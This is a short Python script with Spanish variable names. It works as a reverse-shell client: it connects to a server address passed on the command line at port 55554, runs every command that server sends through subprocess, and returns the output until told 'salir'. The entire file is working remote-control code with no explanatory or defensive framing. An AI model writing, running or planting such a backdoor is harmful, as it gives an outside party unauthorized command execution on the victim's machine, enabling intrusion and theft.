#!/usr/bin/python3.8

import socket
import subprocess
import sys

servidor = sys.argv[1]
puerto = 55554
buffer = 1024

s = socket.socket()
s.connect((servidor, puerto))

mensaje = s.recv(buffer).decode()
print("Servidor: ", mensaje)

while True:
 comando = s.recv(buffer).decode()
 if comando.lower() == 'salir':
  break
 ejecucion = subprocess.getoutput(comando)
 s.send(ejecucion.encode())
s.close()
